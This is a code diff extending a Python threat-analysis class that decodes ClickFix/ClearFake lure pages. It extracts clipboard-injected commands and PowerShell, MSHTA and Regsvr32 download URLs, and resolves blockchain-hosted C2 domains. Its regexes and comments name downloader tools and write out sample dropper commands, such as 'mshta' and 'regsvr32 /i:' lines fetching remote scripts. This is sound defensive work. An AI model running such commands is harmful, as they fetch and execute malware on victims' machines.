@@ -1,22 +1,30 @@
 import re
 import base64
 import requests
+import functools
 
 class PayloadDecoder:
     """
     Deobfuscation and extraction engine for ClickFix / ClearFake payloads:
     1. Base64 encoded URLs (aHR0...)
-    2. PowerShell UTF-16LE (-enc ...)
-    3. ClearFake Double-XOR JavaScript
-    4. Polygon / BSC Smart Contract C2 Resolver
+    2. PowerShell UTF-16LE (-enc ...) & LOLBAS Downloaders
+    3. Generic Clipboard Injection (navigator.clipboard.writeText)
+    4. MSHTA, Rundll32, Regsvr32 execution vectors
+    5. ClearFake Double-XOR JavaScript
+    6. Polygon / BSC Smart Contract C2 Resolver (with LRU Cache)
     """
     B64_URL_PATTERN = re.compile(r'(aHR0cHM6Ly[A-Za-z0-9+/=]{10,}|aHR0cDov[A-Za-z0-9+/=]{10,})')
-    PS_ENC_PATTERN = re.compile(r'-(?:e|enc|encodedcommand)\s+([A-Za-z0-9+/=]{20,})', re.IGNORECASE)
+    PS_ENC_PATTERN = re.compile(
+        r'[-/](?:e|en|enc|enco|encod|encode|encoded|encodedc|encodedcommand)\s+["\']?([A-Za-z0-9+/=]{16,})["\']?',
+        re.IGNORECASE
+    )
 
     # Public RPC nodes for blockchain queries
     RPC_ENDPOINTS = [
+        "https://polygon-rpc.com",
         "https://polygon-bor-rpc.publicnode.com",
         "https://1rpc.io/matic",
+        "https://polygon.llamarpc.com",
         "https://polygon.drpc.org",
         "https://rpc.ankr.com/polygon"
     ]
@@ -34,47 +42,110 @@ class PayloadDecoder:
                 decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                 urls = re.findall(r'https?://[^\s\'"<>]+', decoded)
                 for u in urls:
-                    if not any(b in u.lower() for b in ["w3.org", "schema.org", "google.com/recaptcha", "adobe.com/xap", "xml.org", "openxmlformats", "purl.org", "xmlns.com"]):
+                    if not any(b in u.lower() for b in [
+                        "w3.org", "schema.org", "google.com/recaptcha",
+                        "adobe.com/xap", "xml.org", "openxmlformats",
+                        "purl.org", "xmlns.com"
+                    ]):
                         found_urls.append(u)
             except Exception:
                 pass
         return list(set(found_urls))
 
     @classmethod
-    def decode_powershell(cls, text: str) -> list[str]:
-        """Decodes PowerShell encoded or plain irm/iex commands and extracts URLs"""
-        found_urls = []
-        # 1. Base64 UTF-16LE encoded commands
-        match = cls.PS_ENC_PATTERN.search(text)
-        if match:
+    def decode_clipboard_commands(cls, text: str) -> list[str]:
+        """
+        Extracts strings copied into clipboard via:
+        - navigator.clipboard.writeText(...)
+        - document.execCommand('copy')
+        - clipboardData.setData('text', ...)
+        - Hidden inputs or variables intended for victim clipboard copy
+        """
+        commands = []
+        # Pattern 1: navigator.clipboard.writeText(...)
+        clip_matches = re.findall(r"navigator\.clipboard\.writeText\s*\(\s*(['\"`])(.*?)\1\s*\)", text, re.DOTALL | re.IGNORECASE)
+        for _, cmd in clip_matches:
+            cleaned = cmd.replace(r'\"', '"').replace(r"\'", "'").replace(r"\n", " ").strip()
+            if cleaned:
+                commands.append(cleaned)
+
+        # Pattern 2: clipboardData.setData('text', ...)
+        setdata_matches = re.findall(r"clipboardData\.setData\s*\(\s*['\"](?:text|Text)['\"]\s*,\s*(['\"`])(.*?)\1\s*\)", text, re.DOTALL | re.IGNORECASE)
+        for _, cmd in setdata_matches:
+            cleaned = cmd.replace(r'\"', '"').replace(r"\'", "'").replace(r"\n", " ").strip()
+            if cleaned:
+                commands.append(cleaned)
+
+        # Pattern 3: String assigned to variable right before execCommand('copy')
+        exec_matches = re.findall(r"(?:var|let|const)?\s*([a-zA-Z0-9_$]+)\s*=\s*(['\"`])(powershell|mshta|curl|cmd|bash.*?)\2.*?execCommand\s*\(\s*['\"]copy['\"]\s*\)", text, re.DOTALL | re.IGNORECASE)
+        for _, _, cmd in exec_matches:
+            commands.append(cmd.strip())
+
+        return list(set(commands))
+
+    @classmethod
+    def deobfuscate_powershell_strings(cls, text: str) -> str:
+        """Resolves string concatenation and format operator (-f) in PowerShell scripts"""
+        # Remove PowerShell backtick evasion (e.g. `i`e`x -> iex)
+        text_clean = re.sub(r"`([a-zA-Z])", r"\1", text)
+
+        # Reconstruct format operators: ('{0}{1}' -f 'h','ttps://')
+        def resolve_format(match):
+            fmt_str = match.group(1)
+            raw_args = match.group(2)
+            args = re.findall(r"['\"]([^'\"]*)['\"]", raw_args)
             try:
-                b64 = match.group(1)
-                padding = len(b64) % 4
+                return f"'{fmt_str.format(*args)}'"
+            except Exception:
+                return match.group(0)
+
+        text_clean = re.sub(r"['\"]([^'\"]+)['\"]\s*-f\s*([^\);]+)", resolve_format, text_clean)
+
+        # Reconstruct string concatenation with possible parentheses: ('ht') + ('tps://')
+        text_clean = re.sub(r"['\"]\s*\)?\s*\+\s*\(?\s*['\"]", "", text_clean)
+        return text_clean
+
+    @classmethod
+    def decode_powershell(cls, text: str) -> list[str]:
+        """
+        Decodes PowerShell commands (Base64 UTF-16LE or plain text)
+        and extracts secondary payload/staging URLs.
+        """
+        found_urls = []
+        deobf_text = cls.deobfuscate_powershell_strings(text)
+
+        # 1. Base64 UTF-16LE encoded commands
+        matches = cls.PS_ENC_PATTERN.findall(text) + cls.PS_ENC_PATTERN.findall(deobf_text)
+        for b64 in matches:
+            try:
+                b64_clean = b64.strip("\"'")
+                padding = len(b64_clean) % 4
                 if padding:
-                    b64 += '=' * (4 - padding)
-                decoded = base64.b64decode(b64).decode('utf-16le', errors='ignore')
+                    b64_clean += '=' * (4 - padding)
+                decoded = base64.b64decode(b64_clean).decode('utf-16le', errors='ignore')
                 urls = re.findall(r'https?://[^\s\'"<>]+', decoded)
                 found_urls.extend(urls)
             except Exception:
                 pass
 
-        # 2. Plain irm / iex / Invoke-WebRequest / DownloadString with flags like -Uri, -Url
-        plain_urls = re.findall(
-            r"(?:irm|iwr|Invoke-RestMethod|Invoke-WebRequest|DownloadString|DownloadFile)\s*(?:-(?:Uri|Url|OutFile)\s+['\"]?[^'\"\s\)]+['\"]?\s+)*(?:-(?:Uri|Url)\s*)?(?:['\"]|\(\s*['\"])(https?://[^'\"\s\)]+)", 
-            text, 
-            re.IGNORECASE
-        )
-        for u in plain_urls:
-            u_clean = u.replace(r"\/", "/")
-            if "." in u_clean.split("://")[-1]:
-                found_urls.append(u_clean)
+        # 2. Plain irm / iwr / DownloadString / WebClient / BITSAdmin / Certutil / Curl
+        patterns = [
+            r"(?:irm|iwr|Invoke-RestMethod|Invoke-WebRequest|certutil(?:\.exe)?|curl(?:\.exe)?|wget|Start-BitsTransfer)\s+.*?(?:-(?:Uri|Url|Source)\s+)?['\"\(]*\s*(https?://[^\s'\"\)\;]+)",
+            r"(?:DownloadString|DownloadFile)\s*\(\s*['\"\(]*\s*(https?://[^\s'\"\)\;]+)"
+        ]
+
+        for p in patterns:
+            for u in re.findall(p, deobf_text, re.IGNORECASE):
+                u_clean = u.rstrip("'\"").replace(r"\/", "/")
+                if "." in u_clean.split("://")[-1]:
+                    found_urls.append(u_clean)
 
         return list(set(found_urls))
 
     @classmethod
     def decode_mshta(cls, text: str) -> dict:
         """
-        Detects and extracts MSHTA / ActiveXObject (MSXML2.XMLHTTP, ADODB.Stream, WScript.Shell)
+        Detects and extracts MSHTA / Rundll32 / Regsvr32 / ActiveXObject
         ClickFix execution vectors copying directly to the Run box:
         mshta "javascript:var x=new ActiveXObject('MSXML2.XMLHTTP');x.open('GET','<URL>',false);...Run(p);"
         """
@@ -84,25 +155,39 @@ class PayloadDecoder:
             "drop_filename": None,
             "staging_urls": []
         }
-        if not ("mshta" in text.lower() or "activexobject" in text.lower()):
+        text_lower = text.lower()
+        if not ("mshta" in text_lower or "activexobject" in text_lower or "regsvr32" in text_lower or "rundll32" in text_lower):
             return result
 
-        # Check for MSXML2.XMLHTTP or ADODB.Stream
-        if "MSXML2.XMLHTTP" in text or "ActiveXObject" in text:
+        urls = []
+        # MSHTA Direct URL: mshta https://malware.com/script.hta
+        direct_mshta = re.findall(r"mshta(?:\.exe)?\s+['\"]?(https?://[^'\"\s]+)", text, re.IGNORECASE)
+        urls.extend(direct_mshta)
+
+        # Regsvr32 Scrobj: regsvr32 /u /n /s /i:http://... scrobj.dll
+        regsvr_urls = re.findall(r"regsvr32(?:\.exe)?\s+.*?/i:(https?://[^\s'\"<>]+)", text, re.IGNORECASE)
+        urls.extend(regsvr_urls)
+
+        # MSXML2.XMLHTTP or ADODB.Stream or direct executable downloads
+        if "MSXML2.XMLHTTP" in text or "ActiveXObject" in text or "ADODB.Stream" in text:
             result["is_mshta"] = True
-            urls = re.findall(r"open\s*\(\s*['\"]GET['\"]\s*,\s*['\"](https?://[^'\"]+)['\"]", text, re.IGNORECASE)
+            open_urls = re.findall(r"open\s*\(\s*['\"]GET['\"]\s*,\s*['\"](https?://[^'\"]+)['\"]", text, re.IGNORECASE)
+            urls.extend(open_urls)
             if not urls:
-                urls = re.findall(r"['\"](https?://[^'\"]+\.(?:exe|bat|zip|ps1|vbs|dll)[^'\"]*)['\"]", text, re.IGNORECASE)
-            
+                file_urls = re.findall(r"['\"](https?://[^'\"]+\.(?:exe|bat|zip|ps1|vbs|dll|hta)[^'\"]*)['\"]", text, re.IGNORECASE)
+                urls.extend(file_urls)
+
+            fn_m = re.search(r"BuildPath\([^,]+,\s*['\"]([^'\"]+)['\"]\)", text)
+            if fn_m:
+                result["drop_filename"] = fn_m.group(1)
+
+        if urls:
+            result["is_mshta"] = True
             for u in urls:
                 u_c = u.replace(r"\/", "/")
                 result["staging_urls"].append(u_c)
                 if not result["download_url"]:
                     result["download_url"] = u_c
-
-            fn_m = re.search(r"BuildPath\([^,]+,\s*['\"]([^'\"]+)['\"]\)", text)
-            if fn_m:
-                result["drop_filename"] = fn_m.group(1)
 
         return result
 
@@ -128,17 +213,22 @@ class PayloadDecoder:
             "wua_token": None
         }
 
+        clip_cmds = cls.decode_clipboard_commands(dom_or_js)
+        has_clipboard = len(clip_cmds) > 0
         has_cfmd = "__cfmdCaptcha" in dom_or_js
         has_commands = 'COMMANDS = {"windows":' in dom_or_js or 'COMMANDS = {windows:' in dom_or_js
         has_wua = "X-WUA" in dom_or_js or "WUA/" in dom_or_js
         has_kl = "KL.bat" in dom_or_js or "KL.zip" in dom_or_js or "verify-page.js" in dom_or_js
         has_lom = "/lom/" in dom_or_js or "/lom_p2/" in dom_or_js or "/hex/lom/" in dom_or_js
-        has_mshta = "mshta" in dom_or_js.lower() and "activexobject" in dom_or_js.lower()
+        has_mshta = ("mshta" in dom_or_js.lower() and "activexobject" in dom_or_js.lower()) or "MSXML2.XMLHTTP" in dom_or_js
         has_spotlight = "open Spotlight" in dom_or_js or "secure.gateway" in dom_or_js
         has_claude_lure = "claudedevz" in dom_or_js or ("claude.com" in dom_or_js and "verification" in dom_or_js.lower()) or "cocuktekstil" in dom_or_js or "Challenge Response ID" in dom_or_js
         has_win_sec = "Windows Security" in dom_or_js and "Human verification required" in dom_or_js
+        has_meet = any(m in dom_or_js.lower() for m in ["google meet", "microphone not working", "audio issue", "permission denied", "click to fix audio"])
+        has_browser_update = any(b in dom_or_js.lower() for b in ["update chrome", "update your browser", "outdated browser", "browser update required"])
+        has_pdf_viewer = any(p in dom_or_js.lower() for p in ["pdf viewer", "adobe reader update", "document cannot be displayed"])
 
-        if not (has_cfmd or has_commands or has_wua or has_kl or has_lom or has_mshta or has_spotlight or has_claude_lure or has_win_sec):
+        if not (has_clipboard or has_cfmd or has_commands or has_wua or has_kl or has_lom or has_mshta or has_spotlight or has_claude_lure or has_win_sec or has_meet or has_browser_update or has_pdf_viewer):
             return result
 
         result["is_cfmd"] = True
@@ -149,9 +239,15 @@ class PayloadDecoder:
             result["lure_type"] = "Fake Windows Security (MSHTA / ActiveXObject Dropper)"
         elif has_spotlight:
             result["lure_type"] = "Fake Secure Gateway (macOS Spotlight / Terminal)"
+        elif has_meet:
+            result["lure_type"] = "Fake Online Meeting / Audio Check Lure"
+        elif has_browser_update:
+            result["lure_type"] = "Fake Web Browser Update Lure"
+        elif has_pdf_viewer:
+            result["lure_type"] = "Fake Document Viewer / PDF Fix"
         elif "MICROSOFT ACCOUNT" in dom_or_js or "ms_verify_you" in dom_or_js or "Confirm this sign-in" in dom_or_js:
             result["lure_type"] = "Fake Microsoft Account Verification"
-        elif "cf_verify_action" in dom_or_js or "Verify you are human" in dom_or_js or "cf_needs_review" in dom_or_js:
+        elif "cf_verify_action" in dom_or_js or "Verify you are human" in dom_or_js or "cf_needs_review" in dom_or_js or "captcha" in dom_or_js.lower():
             result["lure_type"] = "Fake Cloudflare Verification"
         elif has_kl:
             result["lure_type"] = "Fake Cloudflare / Multi-Stage Batch Dropper"
@@ -228,6 +324,16 @@ class PayloadDecoder:
             u_c = u.replace(r"\/", "/")
             if "." in u_c.split("://")[-1]:
                 urls.add(u_c)
+
+        # Format H: Generic Clipboard Extracted Commands
+        for cmd in clip_cmds:
+            for u in cls.decode_powershell(cmd):
+                urls.add(u)
+            m_res = cls.decode_mshta(cmd)
+            for u in m_res.get("staging_urls", []):
+                urls.add(u)
+            for u in cls.decode_b64_urls(cmd):
+                urls.add(u)
 
         clean_urls = list(urls)
         result["staging_urls"] = clean_urls
@@ -316,8 +422,12 @@ class PayloadDecoder:
         return result
 
     @classmethod
+    @functools.lru_cache(maxsize=256)
     def resolve_blockchain_c2(cls, contract_addr: str, method_hash: str) -> str:
-        """Queries Polygon RPC nodes using eth_call to get the live C2 domain"""
+        """
+        Queries Polygon RPC nodes using eth_call to get the live C2 domain.
+        LRU-cached for high performance and rate-limit immunity.
+        """
         payload = {
             "jsonrpc": "2.0",
             "method": "eth_call",
@@ -327,7 +437,7 @@ class PayloadDecoder:
 
         for rpc in cls.RPC_ENDPOINTS:
             try:
-                resp = requests.post(rpc, json=payload, timeout=5)
+                resp = requests.post(rpc, json=payload, timeout=4)
                 if resp.status_code == 200:
                     raw_hex = resp.json().get("result", "")
                     if raw_hex and len(raw_hex) > 130:
